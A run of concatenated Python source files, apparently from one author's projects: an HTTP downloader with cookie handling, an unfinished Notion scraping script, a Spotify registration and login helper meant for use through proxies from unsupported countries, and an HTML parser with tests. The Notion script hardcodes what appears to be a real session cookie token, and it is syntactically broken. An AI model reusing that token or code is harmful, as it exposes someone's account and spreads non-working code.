	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:23.0) Gecko/20100101 Firefox/23.0",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}



#= Functions & objects ========================================================
class Downloader():
	"""
	Lightweight class utilizing downloads from internet.

	Main method: .download()

	Important properties:
		.headers
		.response_headers
		.cookies
		.handle_cookies
	"""

	def __init__(self, headers = None, handle_cookies = True, http_proxy = None):
		"""
		You can set:

		headers -- default IEHeaders, but there is also LFFHeaders
		handle_cookies -- set to false if you don't wish to automatically handle cookies
		http_proxy -- 'url:port' describing HTTP proxy
		"""
		self.headers = headers if headers is not None else IEHeaders
		self.response_headers = None

		self.cookies = {}
		self.handle_cookies = True

		self.http_proxy = None
		if http_proxy is not None:
			self.http_proxy = {'http': http_proxy}


	def download(self, url, get = None, post = None, head = None):
		"""
		Parameters:
		url -- set url to download, automatically adds htt:// if not present
		get -- dict with GET parameters 
		post -- dict with POST parameters
		head -- set to True if you wish to use HEAD request. Returns headers from
		server.
		"""
		# POST params
		if post is not None:
			if type(post) != dict:
				raise TypeError("Unknown type of post paramters.")
			post = urllib.urlencode(post)

		# append GET params to url
		if get is not None:
			if type(get) != dict:
				raise TypeError("Unknown type of get paramters.")
			get = urllib.urlencode(get)
			if "?" in url:
				if url[-1] == "&":
					url += get
				else:
					url += "&" + get
			else:
				url += "?" + get

			get = None

		# check if protocol is specified in |url|
		if not "://" in url:
			url = "http://" + url

		if self.handle_cookies:
			self.__setCookies(url)

		# HEAD request support
		url_req = urllib2.Request(url, post, self.headers)
		if head is not None:
			url_req.get_method = lambda: "HEAD"

		# http proxy support
		opener = None
		if self.http_proxy is None:
			opener = urllib2.build_opener()
		else:
			opener = urllib2.build_opener(urllib2.ProxyHandler(self.http_proxy))

		# download page and save headers from server
		f = opener.open(url_req)
		data = f.read()
		self.response_headers = f.info().items()
		f.close()

		if self.handle_cookies:
			self.__readCookies(url)

		# i suppose I could fix __readCookies() to use dict, but .. meh
		self.response_headers = dict(self.response_headers)

		# head doesn't have content, so return just response headers
		if head is not None:
			return self.response_headers

		return data


	def __setCookies(self, url):
		# add cokies into headers
		domain = self.__getDomain(url)
		if domain in self.cookies.keys():
			cookie_string = ""
			for key in self.cookies[domain].keys():
				cookie_string += key + "=" + str(self.cookies[domain][key]) + "; "

			self.headers["Cookie"] = cookie_string.strip()


	def __readCookies(self, url):
		# simple (and lame) cookie handling
		# parse "set-cookie" string
		cookie_string = ""
		for c in self.response_headers:
			if c[0].lower() == "set-cookie":
				cookie_string = c[1]

		# parse keyword:values
		tmp_cookies = {}
		for c in cookie_string.split(","):
			cookie = c
			if ";" in c:
				cookie = c.split(";")[0]
			cookie = cookie.strip()

			cookie = cookie.split("=")
			keyword = cookie[0]
			value = "=".join(cookie[1:])

			tmp_cookies[keyword] = value

		# append global variable cookis with new cookies
		if len(tmp_cookies) > 0:
			domain = self.__getDomain(url)

			if domain in self.cookies.keys():
				for key in tmp_cookies.keys():
					self.cookies[domain][key] = tmp_cookies[key]
			else:
				self.cookies[domain] = tmp_cookies

		# check for blank cookies
		if len(self.cookies) > 0:
			for domain in self.cookies.keys():
				for key in self.cookies[domain].keys():
					if self.cookies[domain][key].strip() == "":
						del self.cookies[domain][key]

				if len(self.cookies[domain]) == 0:
					del self.cookies[domain]


	def __getDomain(self, url):
		"""
		Parse domain from url.
		"""
		if "://" in url:
			url = url.split("://")[1]

		if "/" in url:
			url = url.split("/")[0]

		return url
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from httpkie import *#! /usr/bin/env python3
import requests


HEADERS = """
Host: www.notion.so
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.9) Gecko/20100101 Goanna/4.1 Firefox/60.9 PaleMoon/28.2.1
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Referer: https://www.notion.so/sharedmindspace/Bystroushaak-s-blog-702b4a575ecf4c2298f76a2786c46053
Content-Length: 122
Cookie: __cfduid=dbf22c629c95ce7e01cb419288f3c97411538265472; token_v2=4170ea5fcca4e024cfcc50511c4f5f9bb3ed79d3c77c927efc7469152cacb62112a6d098866ca4d8945d1552ff02ac1ee2fd5f7ad4e3404a340b5d3c9f6c1d6b39a0a99744d83dff952e6fc64b11; userId=172d356e-71e9-4167-9182-371034cbba34
Connection: keep-alive
"""

JSON_PARAMS = """
chunkNumber:0
cursor:Object
limit:50
pageId:"702b4a57-5ecf-4c22-98f7-6a2786c46053"
verticalColumns:false
"""

# getRecordValues
def load_page_chunk(json_data):
    api_url = "https://www.notion.so/api/v3/loadPageChunk"
    resp = requests.post(api_url, json=json_data)
    return resp.json()


def tokenize


url = "https://www.notion.so/9439524048de45169fd74f5e92fb9598?v=7336e15a56594c1d944be109655c2d95"

resp = requests.get(url)
print resp.text
print resp.json()

# print load_page_chunk({
#     "chunkNumber": 0,
#     "limit": 50,
#     "pageId": "702b4a57-5ecf-4c22-98f7-6a2786c46053",
#     "verticalColumns": False,
# })
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from spotifier import *# -*- coding: utf-8 -*-
"""
Module for registration/login to spotify.

This is specifically usefull for users from non-supported countries, because it
allows them to login / register with proxy with much more ease.

Functions supports http_proxy keyword. Only HTTP proxies are supported, HTTPS
aren't! If you wan't to use SOCK5 proxy, see IPtools:
https://github.com/Bystroushaak/IPtools

Author: Bystroushaak (bystrousak@kitakitsune.org)
Interpreter version: python 2.7
This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/).
"""
#= Imports ====================================================================
import sys
import json
import time



try:
	import dhtmlparser as html
except ImportError:
	sys.stderr.write(
		"This script requires pyDHTMLParser python module.\n"
		"You can download it from "
		"https://github.com/Bystroushaak/pyDHTMLParser\n"
	)
	sys.exit(1)

try:
	from httpkie import Downloader
except ImportError:
	sys.stderr.write(
		"This script requires httpkie python module.\n"
		"You can download it from "
		"https://github.com/Bystroushaak/httpkie\n"
	)
	sys.exit(1)



#= Functions & objects ========================================================
class SpotifierException(Exception):
	""
	def __init__(self, value):
		self.value = value

	def __str__(self):
		return repr(self.value)


class InvalidUsernameException(SpotifierException):
	"Raised if username is considered invalid or is already used."
	def __init__(self, value):
		self.value = value


class InvalidPasswordException(SpotifierException):
	def __init__(self, value):
		self.value = value


class EmailTakenException(SpotifierException):
	"Raised when there is already account paired with this email."
	def __init__(self, value):
		self.value = value


class InvalidGenderException(SpotifierException):
	"Raised if there is unknown gender used."
	def __init__(self, value):
		self.value = value



def register(username, password, email, gender, date_of_birth_ts, http_proxy = None):
	"""
	Register new account, raise proper exceptions if there is a problem:
	 - InvalidUsernameException
	 - InvalidPasswordException
	 - EmailTakenException
	 - InvalidGenderException is raised when gender parameter is not "male"/"female"
	 - SpotifierException is raised in other cases (see .value for details from
	   server)

	Email is not verified, so you can use pretty much everything.

	Bevare of date_of_birth_ts timestamp - spotify won't let you register too
	much young accounts, so in case of trouble, try subtracting 567648000 for 18
	years.

	Function supports http_proxy parameter in format "http://server:port".
	"""
	d = Downloader(http_proxy = http_proxy)
	d.download(  # cookies
		"https://www.spotify.com/us/login/?forward_url=%2Fus%2F",
	)
	dom = html.parseString(
		d.download("https://www.spotify.com/us/signup/?forward_url=%2Fus%2F"),
	)

	# check username
	valid_username = d.download(
		"https://www.spotify.com/us/xhr/json/isUsernameAvailable.php",
		get = {"username": username}
	)
	if valid_username.strip() != "true":
		raise InvalidUsernameException(
			"Username '" + username + "' is invalid or already in use!"
		)

	# check password lenght
	min_password_len = dom.find("input", {"name": "password"})[0]
	min_password_len = int(min_password_len.params["data-rule-minlength"])
	if len(password) <= min_password_len:
		raise InvalidPasswordException("Password is too short.")

	# check email
	valid_email = d.download(
		"https://www.spotify.com/us/xhr/json/isEmailAvailable.php",
		get = {"email": email}
	)
	if valid_email.strip() != "true":
		raise EmailTakenException("Email is already used!")

	day, month, year = time.strftime(
		"%d %m %Y", time.localtime(int(date_of_birth_ts))
	).split()

	gender = gender.lower()
	if gender != "male" and gender != "female":
		raise InvalidGenderException(
			"Spotify doesn't support '" + gender + "' as gender!"
		)

	reg_form = {
		"form_token":    dom.find("input", {"name": "form_token"})[0].params["value"],
		"creation_flow": "",
		"forward_url":   "/us/",
		"username":      username,
		"password":      password,
		"email":         email,
		"confirm_email": email,
		"gender":        gender,
		"dob_month":     month,
		"dob_day":       day,
		"dob_year":      year,
		"signup_pre_tick_eula": "true",
	}

	data = d.download(
		"https://www.spotify.com/us/xhr/json/sign-up-for-spotify.php",
		post = reg_form,
	)

	jdata = json.loads(data)
	if jdata["status"] != 1:
		errors = []
		for error in jdata["errors"]:
			errors.append(error + ": " + jdata["errors"][error]["message"])
		raise SpotifierException(
			jdata["message"] + "\n" +
			"\n".join(errors)
		)


def login(username, password, http_proxy = None):
	"""
	Just login into spotify. This is usefull, because users from unsupported
	countries have to login thru IP from supported country every ~twoweeks, or
	their account is frozen until they do so.

	Function supports http_proxy parameter in format "http://server:port".

	Raise:
	 - SpotifierException if there is some problem.
	"""
	d = Downloader(http_proxy = http_proxy)
	dom = html.parseString(
		d.download(
			"https://www.spotify.com/us/login/?forward_url=%2Fus%2F",
		)
	)

	log_form = {
		"referrer": "",
		"utm-keywords": dom.find("input", {"name": "utm-keywords"})[0].params["value"],
		"user_name": username,
		"password": password
	}

	data = d.download(
		"https://www.spotify.com/us/xhr/json/login.php",
		post = log_form,
	)
	jdata = json.loads(data)

	if jdata["error"]:
		raise SpotifierException(jdata["msg"])
# -*- coding: utf-8 -*-
# This file is there mainly for 'git submodule' use in other projects.

from dhtmlparser import *#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Author: Bystroushaak (bystrousak@kitakitsune.org)
This version doens't corresponds with DHTMLParser v1.5.0 - there were updates,
which makes both parsers incompatible.

This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/cz/).

Project page; https://github.com/Bystroushaak/pyDHTMLParser
"""



# Nonpair tags
NONPAIR_TAGS = [
	"br",
	"hr",
	"img",
	"input",
	#"link",
	"meta",
	"spacer",
	"frame",
	"base"
]



def unescape(inp, quote = '"'):
	if len(inp) < 2:
		return inp

	output = ""
	unesc = False
	for act in inp:
		if act == quote and unesc:
			output = output[:-1]

		output += act

		if act == "\\":
			unesc = not unesc
		else:
			unesc = False

	return output


def escape(input, quote = '"'):
	output = ""

	for c in input:
		if c == quote:
			output += '\\'

		output += c

	return output


def rotate_buff(buff):
	"Rotate buffer (for each buff[i] = buff[i-1])"
	i = len(buff) - 1
	while i > 0:
		buff[i] = buff[i - 1]
		i -= 1

	return buff


class SpecialDict(dict):
	"""
	This dictionary stores items case sensitive, but compare them case
	INsensitive.
	"""
	def __contains__(self, k):
		for item in super(SpecialDict, self).keys():
			if k.lower() == item.lower():
				return True

	def __getitem__(self, k):
		for item in self.keys():
			if k.lower() == item.lower():
				return super(SpecialDict, self).__getitem__(item)



class HTMLElement():
	"""
	Container for parsed html elements.
	"""

	def __init__(self, tag = "", second = None, third = None):
		self.__element = None
		self.__tagname = ""

		self.__istag        = False
		self.__isendtag     = False
		self.__iscomment    = False
		self.__isnonpairtag = False

		self.childs = []
		self.params = SpecialDict()
		self.endtag = None
		self.openertag = None

		# blah, constructor overloading in python sux :P
		if isinstance(tag, str) and second is None and third is None:
			self.__init_tag(tag)
		elif isinstance(tag, str) and isinstance(second, dict) and third is None:
			self.__init_tag_params(tag, second)
		elif isinstance(tag, str) and isinstance(second, dict) and     \
		     (isinstance(third, list) or isinstance(third, tuple)) and \
		     len(third) > 0 and isinstance(third[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"
			self.__init_tag_params(tag, second)
			self.childs = closeElements(third)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif isinstance(tag, str) and (isinstance(second, list) or \
			 isinstance(second, tuple)) and len(second) > 0 and    \
			 isinstance(second[0], HTMLElement):

			# containers with childs are automatically considered tags
			if tag.strip() != "":
				if not tag.startswith("<"):
					tag = "<" + tag
				if not tag.endswith(">"):
					tag += ">"

			self.__init_tag(tag)
			self.childs = closeElements(second)
			self.endtag = HTMLElement("</" + self.getTagName() + ">")
		elif (isinstance(tag, list) or isinstance(tag, tuple)) and len(tag) > 0 \
		     and isinstance(tag[0], HTMLElement):
			self.__init_tag("")
			self.childs = closeElements(tag)
		else:
			raise Exception("Oh no, not this crap!")


	#===========================================================================
	#= Constructor overloading =================================================
	#===========================================================================
	def __init_tag(self, tag):
			self.__element = tag

			self.__parseIsTag()
			self.__parseIsComment()

			if (not self.__istag) or self.__iscomment:
				self.__tagname = self.__element
			else:
				self.__parseTagName()

			if self.__iscomment or not self.__istag:
				return

			self.__parseIsEndTag()
			self.__parseIsNonPairTag()

			if self.__istag and (not self.__isendtag) or "=" in self.__element:
				self.__parseParams()


	# used when HTMLElement(tag, params) is called - basically create string
	# from tagname and params
	def __init_tag_params(self, tag, params):
		tag = tag.strip().replace(" ", "")
		nonpair = ""

		if tag.startswith("<"):
			tag = tag[1:]

		if tag.endswith("/>"):
			tag = tag[:-2]
			nonpair = " /"
		elif tag.endswith(">"):
			tag = tag[:-1]

		output = "<" + tag

		for key in params.keys():
			output += " " + key + '="' + escape(params[key], '"') + '"'

		self.__init_tag(output + nonpair + ">")


	def find(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAll, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAll(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Same as findAllB, but without endtags. You can always get them from
		.endtag property..
		"""

		dom = self.findAllB(tag_name, params, fn, case_sensitive)

		return filter(lambda x: not x.isEndTag(), dom)


	def findAll(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Depth-first algorithm
		http://en.wikipedia.org/wiki/Depth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		tmp = []
		for el in self.childs:
			tmp = el.findAll(tag_name, params, fn, case_sensitive)

			if tmp is not None and len(tmp) > 0:
				output.extend(tmp)

		return output


	def findAllB(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Simple search engine using Breadth-first algorithm
		http://en.wikipedia.org/wiki/Breadth-first_search.

		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.

		@param tag_name: Name of tag.
		@type tag_name: string

		@param params: Parameters of arg.
		@type params: dictionary

		@param fn: User defined function for search.
		@type fn: lambda function

		@param case_sensitive: Search case sensitive. Default True.
		@type case_sensitive: bool

		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []

		if self.isAlmostEqual(tag_name, params, fn, case_sensitive):
			output.append(self)

		breadth_search = self.childs
		for el in breadth_search:
			if el.isAlmostEqual(tag_name, params, fn, case_sensitive):
				output.append(el)

			if len(el.childs) > 0:
				breadth_search.extend(el.childs)

		return output


	#==========================================================================
	#= Parsers ================================================================
	#==========================================================================
	def __parseIsTag(self):
		if self.__element.startswith("<") and self.__element.endswith(">"):
			self.__istag = True
		else:
			self.__istag = False


	def __parseIsEndTag(self):
		last = ""
		self.__isendtag = False

		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == "/" and last == "<":
					self.__isendtag = True
				if ord(c) > 32:
					last = c


	def __parseIsNonPairTag(self):
		last = ""
		self.__isnonpairtag = False

		# Tags endings with /> are nonpair - do not mind whitespaces (< 32)
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == ">" and last == "/":
					self.__isnonpairtag = True
					return
				if ord(c) > 32:
					last = c

		# Check listed nonpair tags
		if self.__tagname.lower() in NONPAIR_TAGS:
			self.__isnonpairtag = True


	def __parseIsComment(self):
		if self.__element.startswith("<!--") and self.__element.endswith("-->"):
			self.__iscomment = True
		else:
			self.__iscomment = False


	def __parseTagName(self):
		for el in self.__element.split(" "):
			el = el.replace("/", "").replace("<", "").replace(">", "")
			if len(el) > 0:
				self.__tagname = el.rstrip()
				return


	def __parseParams(self):
		# check if there are any parameters
		if " " not in self.__element or "=" not in self.__element:
			return

		# Remove '<' & '>'
		params = self.__element.strip()[1:-1].strip()
		# Remove tagname
		params = params[
			params.find(self.getTagName()) + len(self.getTagName()):
		].strip()

		# Parser machine
		next_state = 0
		key = ""
		value = ""
		end_quote = ""
		buff = ["", ""]
		for c in params:
			if next_state == 0:  # key
				if c.strip() != "":  # safer than list space, tab and all possible whitespaces in UTF
					if c == "=":
						next_state = 1
					else:
						key += c
			elif next_state == 1:  # value decisioner
				if c.strip() != "":  # skip whitespaces
					if c == "'" or c == '"':
						next_state = 3
						end_quote = c
					else:
						next_state = 2
						value += c
			elif next_state == 2:  # one word parameter without quotes
				if c.strip() == "":
					next_state = 0
					self.params[key] = value
					key = ""
					value = ""
				else:
					value += c
			elif next_state == 3:  # quoted string
				if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
					next_state = 0
					self.params[key] = unescape(value, end_quote)
					key = ""
					value = ""
					end_quote = ""
				else:
					value += c

			buff = rotate_buff(buff)
			buff[0] = c

		if key != "":
			if end_quote != "" and value.strip() != "":
				self.params[key] = unescape(value, end_quote)
			else:
				self.params[key] = value

		if len(filter(lambda x: x == "/", self.params.keys())) > 0:
			del self.params["/"]
			self.__isnonpairtag = True

	#* /Parsers ****************************************************************


	#===========================================================================
	#= Getters =================================================================
	#===========================================================================
	def isTag(self):
		"True if element is tag (not content)."
		return self.__istag


	def isEndTag(self):
		"True if HTMLElement is end tag (/tag)."
		return self.__isendtag


	def isNonPairTag(self, isnonpair = None):
		"""
		Returns True if HTMLElement is listed nonpair tag table (br for example)
		or if it ends with / - <br /> for example.

		You can also change state from pair to nonpair if you use this as setter.
		"""
		if isnonpair is None:
			return self.__isnonpairtag
		else:
			self.__isnonpairtag = isnonpair
			if not isnonpair:
				self.endtag = None
				self.childs = []


	def isPairTag(self):
		"""
		Return True if this is paired tag - <body> .. </body> for example.
		"""
		if self.isComment() or self.isNonPairTag:
			return False
		if self.isEndTag():
			return True
		if self.isOpeningTag() and self.endtag is not None:
			return True

		return False


	def isComment(self):
		"True if HTMLElement is html comment."
		return self.__iscomment


	def isOpeningTag(self):
		"True if is opening tag."
		if self.isTag() and (not self.isComment()) and (not self.isEndTag()) \
		   and (not self.isNonPairTag()):
			return True
		else:
			return False


	def isEndTagTo(self, opener):
		"Returns true, if this element is endtag to opener."
		if self.__isendtag and opener.isOpeningTag():
			if self.__tagname.lower() == opener.getTagName().lower():
				return True
			else:
				return False
		else:
			return False


	def tagToString(self):
		"Returns tag (with parameters), without content or endtag."
		if len(self.params) <= 0:
			return self.__element
		else:
			output = "<" + str(self.__tagname)

			for key in self.params.keys():
				output += " " + key + "=\"" + escape(self.params[key], '"') + "\""

			return output + " />" if self.__isnonpairtag else output + ">"


	def getTagName(self):
		"Returns tag name."
		return self.__tagname


	def getContent(self):
		"Returns content of tag (everything between opener and endtag)."
		output = ""

		for c in self.childs:
			if not c.isEndTag():
				output += c.toString()

		if output.endswith("\n"):
			output = output[:-1]

		return output


	def prettify(self, depth = 0, separator = "  ", last = True, pre = False, inline = False):
		"Returns prettifyied tag with content."
		output = ""

		if self.getTagName() != "" and self.tagToString().strip() == "":
			return ""

		# if not inside <pre> and not inline, shift tag to the right
		if not pre and not inline:
			output += (depth * separator)

		# for <pre> set 'pre' flag
		if self.getTagName().lower() == "pre" and self.isOpeningTag():
			pre = True
			separator = ""

		output += self.tagToString()

		# detect if inline
		is_inline = inline  # is_inline shows if inline was set by detection, or as parameter
		for c in self.childs:
			if not (c.isTag() or c.isComment()):
				if len(c.tagToString().strip()) != 0:
					inline = True

		# don't shift if inside container (containers have blank tagname)
		original_depth = depth
		if self.getTagName() != "":
			if not pre and not inline:  # inside <pre> doesn't shift tags
				depth += 1
				if self.tagToString().strip() != "":
					output += "\n"

		# prettify childs
		for e in self.childs:
			if not e.isEndTag():
				output += e.prettify(depth, last = False, pre = pre, inline = inline)

		# endtag
		if self.endtag is not None:
			if not pre and not inline:
				output += ((original_depth) * separator)

			output += self.endtag.tagToString().strip()

			if not is_inline:
				output += "\n"

		return output

	#* /Getters ****************************************************************


	#===========================================================================
	#= Operators ===============================================================
	#===========================================================================
	def toString(self, original = False):
		"""
		Returns almost original string (use original = True if you want exact copy).

		If you want prettified string, try .prettify()

		If original == True, return parsed element, so if you changed something
		in .params, there will be no traces of those changes.
		"""
		output = ""

		if self.childs != [] or self.isOpeningTag():
			output += self.__element if original else self.tagToString()

			for c in self.childs:
				output += c.toString(original)

			if self.endtag is not None:
				output += self.endtag.tagToString()
		elif not self.isEndTag():
			output += self.tagToString()

		return output


	def __str__(self):
		return self.toString()


	def isAlmostEqual(self, tag_name, params = None, fn = None, case_sensitive = False):
		"""
		Compare element with given tagname, params and/or by lambda function.

		Lambda function is same as in .find().
		"""

		if isinstance(tag_name, HTMLElement):
			return self.isAlmostEqual(tag_name.getTagName(), self.params)

		# search by lambda function
		if fn is not None:
			if fn(self):
				return True

		if not case_sensitive:
			self.__tagname = self.__tagname.lower()
			tag_name = tag_name.lower()

		# compare tagname
		if self.__tagname == tag_name and self.__tagname != "" and self.__tagname is not None:
			# compare parameters
			if params is None or len(params) == 0:
				return True
			elif len(self.params) > 0:
				for key in params.keys():
					if key not in self.params:
						return False
					elif params[key] != self.params[key]:
						return False

				return True

		return False

	#* /Operators **************************************************************


	#===========================================================================
	#= Setters =================================================================
	#===========================================================================
	def replaceWith(self, el):
		"""
		Replace element. Useful when you don't want change all references to object.
		"""
		self.childs = el.childs
		self.params = el.params
		self.endtag = el.endtag
		self.openertag = el.openertag

		self.__tagname = el.getTagName()
		self.__element = el.tagToString()

		self.__istag = el.isTag()
		self.__isendtag = el.isEndTag()
		self.__iscomment = el.isComment()
		self.__isnonpairtag = el.isNonPairTag()


	def removeChild(self, child, end_tag_too = True):
		"""
		Remove subelement (child) specified by reference.

		This can't be used for removing subelements by value! If you want do
		such thing, do:

		---
		for e in dom.find("value"):
			dom.removeChild(e)
		---

		Params:
			child
				child which will be removed from dom (compared by reference)
			end_tag_too
				remove end tag too - default true
		"""

		if len(self.childs) <= 0:
			return

		end_tag = None
		if end_tag_too:
			end_tag = child.endtag

		for e in self.childs:
			if e == child:
				self.childs.remove(e)
			if end_tag_too and end_tag == e and end_tag is not None:
				self.childs.remove(e)
			else:
				e.removeChild(child, end_tag_too)

	#* /Setters ****************************************************************



def closeElements(childs):
	"Close tags - used in some constructors"

	o = []

	# Close all unclosed pair tags
	for e in childs:
		if e.isTag():
			if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() and e.endtag is None:
				e.childs = closeElements(e.childs)

				o.append(e)
				o.append(HTMLElement("</" + e.getTagName() + ">"))

				# Join opener and endtag
				e.endtag = o[-1]
				o[-1].openertag = e
			else:
				o.append(e)
		else:
			o.append(e)

	return o



def __raw_split(itxt):
	"""
	Parse HTML from text into array filled with tags end text.

	Source code is little bit unintutive, because it is simple parser machine.
	For better understanding, look at;
	http://kitakitsune.org/images/field_parser.png
	"""
	echr = ""
	buff = ["", "", "", ""]
	content = ""
	array = []
	next_state = 0
	inside_tag = False

	for c in itxt:
		if next_state == 0:  # content
			if c == "<":
				if len(content) > 0:
					array.append(content)
				content = c
				next_state = 1
				inside_tag = False
			else:
				content += c
		elif next_state == 1:  # html tag
			if c == ">":
				array.append(content + c)
				content = ""
				next_state = 0
			elif c == "'" or c == '"':
				echr = c
				content += c
				next_state = 2
			elif c == "-" and buff[0] == "-" and buff[1] == "!" and buff[2] == "<":
				if len(content[:-3]) > 0:
					array.append(content[:-3])
				content = content[-3:] + c
				next_state = 3
			else:
				if c == "<":  # jump back into tag instead of content
					inside_tag = True
				content += c
		elif next_state == 2:  # "" / ''
			if c == echr and (buff[0] != "\\" or (buff[0] == "\\" and buff[1] == "\\")):
				next_state = 1
			content += c
		elif next_state == 3:  # html comments
			if c == ">" and buff[0] == "-" and buff[1] == "-":
				if inside_tag:
					next_state = 1
				else:
					next_state = 0
				inside_tag = False

				array.append(content + c)
				content = ""
			else:
				content += c

		# rotate buffer
		buff = rotate_buff(buff)
		buff[0] = c

	if len(content) > 0:
		array.append(content)

	return array



def __repair_tags(raw_input):
	"""
	Repair tags with comments (<HT<!-- asad -->ML> is parsed to
	["<HT", "<!-- asad -->", "ML>"]	and I need ["<HTML>", "<!-- asad -->"])
	"""
	ostack = []

	index = 0
	while index < len(raw_input):
		el = raw_input[index]

		if el.isComment():
			if index > 0 and index < len(raw_input) - 1:
				if raw_input[index - 1].tagToString().startswith("<") and raw_input[index + 1].tagToString().endswith(">"):
					ostack[-1] = HTMLElement(ostack[-1].tagToString() + raw_input[index + 1].tagToString())
					ostack.append(el)
					index += 1
					continue

		ostack.append(el)

		index += 1

	return ostack



def __indexOfEndTag(istack):
	"""
	Go through istack and search endtag. Element at first index is considered as
	opening tag.

	Returns: index of end tag or 0 if not found.
	"""
	if len(istack) <= 0:
		return 0

	if not istack[0].isOpeningTag():
		return 0

	opener = istack[0]
	cnt = 0

	index = 0
	for el in istack[1:]:
		if el.isOpeningTag() and (el.getTagName().lower() == opener.getTagName().lower()):
			cnt += 1
		elif el.isEndTagTo(opener):
			if cnt == 0:
				return index + 1
			else:
				cnt -= 1

		index += 1

	return 0



def __parseDOM(istack):
	"Recursively go through element array and create DOM."
	ostack = []
	end_tag_index = 0

	index = 0
	while index < len(istack):
		el = istack[index]

		end_tag_index = __indexOfEndTag(istack[index:])  # Check if this is pair tag

		if not el.isNonPairTag() and end_tag_index == 0 and not el.isEndTag():
			el.isNonPairTag(True)

		if end_tag_index != 0:
			el.childs = __parseDOM(istack[index + 1: end_tag_index + index])
			el.endtag = istack[end_tag_index + index]  # Reference to endtag
			el.openertag = el
			ostack.append(el)
			ostack.append(el.endtag)
			index = end_tag_index + index
		else:
			if not el.isEndTag():
				ostack.append(el)

		index += 1

	return ostack



def parseString(txt):
	"Parse given string and return DOM from HTMLElements."
	istack = []

	# remove UTF BOM (prettify fails if not)
	if len(txt) > 3 and txt.startswith("\xef\xbb\xbf"):
		txt = txt[3:]

	for el in __raw_split(txt):
		istack.append(HTMLElement(el))

	container = HTMLElement()
	container.childs = __parseDOM(__repair_tags(istack))

	return container



def makeDoubleLinked(dom, parent = None):
	"""
	Standard output from dhtmlparser is single-linked tree. This will make it 
	double-linked.
	"""
	dom.parent = parent

	if len(dom.childs) > 0:
		for child in dom.childs:
			child.parent = dom
			makeDoubleLinked(child, dom)



#==============================================================================
#= Main program ===============================================================
#==============================================================================
if __name__ == "__main__":
	print "Testing.."

	assert unescape(r"""\' \\ \" \n""")      == r"""\' \\ " \n"""
	assert unescape(r"""\' \\ \" \n""", "'") == r"""' \\ \" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""\' \\" \n""")        == r"""\' \\" \n"""
	assert unescape(r"""printf(\"hello \t world\");""") == r"""printf("hello \t world");"""

	assert escape(r"""printf("hello world");""") == r"""printf(\"hello world\");"""
	assert escape(r"""'""", "'") == r"""\'"""

	dom = parseString("""
		"<div Id='xe' a='b'>obsah xe divu</div> <!-- Id, not id :) -->
		 <div id='xu' a='b'>obsah xu divu</div>
	""")

	# find test
	divXe = dom.find("div", {"id":"xe"})[0]
	divXu = dom.find("div", {"id":"xu"})[0]

	# assert divXe.tagToString() == """<div a="b" id="xe">"""
	# assert divXu.tagToString() == """<div a="b" id="xu">"""

	# unit test for toString
	assert divXe.toString() == """<div a="b" Id="xe">obsah xe divu</div>"""
	assert divXu.toString() == """<div a="b" id="xu">obsah xu divu</div>"""

	# getTagName() test
	assert divXe.getTagName() == "div"
	assert divXu.getTagName() == "div"

	# isComment() test
	assert divXe.isComment() == False
	assert divXe.isComment() == divXu.isComment()

	assert divXe.isNonPairTag() != divXe.isOpeningTag()

	assert divXe.isTag() is True
	assert divXe.isTag() == divXu.isTag()

	assert divXe.getContent() == "obsah xe divu"

	# find()/findB() test
	dom = parseString("""
		<div id=first>
			First div.
			<div id=first.subdiv>
				Subdiv in first div.
			</div>
		</div>
		<div id=second>
			Second.
		</div>
	""")

	assert dom.find("div")[1].getContent().strip() == "Subdiv in first div."
	assert dom.findB("div")[1].getContent().strip() == "Second."

	print "Everything ok."
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import dhtmlparser as d

s = """
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>
"""

dom = d.parseString(s)

print dom
print "---\nRemove all <object1>:\n---\n"

# remove all <object1>
for e in dom.find("object1"):
	dom.removeChild(e)


print dom.prettify()


#* Prints: *********************************************************************
"""
<root>
	<object1>Content of first object</object1>
	<object2>Second objects content</object2>
</root>

---
Remove all <object1>:
---

<root>
  <object2>Second objects content</object2>
</root>
"""
#*******************************************************************************#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
from dhtmlparser import *

# if inside container (or other tag), create endtag automatically
print HTMLElement([
